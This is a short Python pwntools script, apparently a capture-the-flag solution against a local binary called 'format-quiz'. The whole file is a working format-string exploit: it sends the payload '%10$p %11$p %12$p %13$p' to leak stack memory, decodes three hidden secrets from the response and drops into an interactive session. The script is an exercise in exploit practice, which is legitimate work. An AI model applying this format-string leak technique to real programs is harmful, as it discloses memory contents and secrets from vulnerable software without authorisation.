#!/usr/bin/env python3
import codecs
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

exe = ELF("./format-quiz")

r = process([exe.path])
# gdb.attach(r)

def decode_bytes(b):
    return codecs.decode(b.decode()[2:], 'hex')[::-1].decode()

r.recvuntil(b"Enter your answer: ")
r.sendline(b"%10$p %11$p %12$p %13$p")
r.recvline()
vals = r.recvline()
vals = vals.split(b" ")

log.info("secret1: " + hex(int(str(vals[3])[4:-11], 16)))
log.info("secret2: " + str(vals[2])[2:-1])
log.info("secret3: " + decode_bytes(vals[0])[1:] + decode_bytes(vals[1]))

r.interactive()
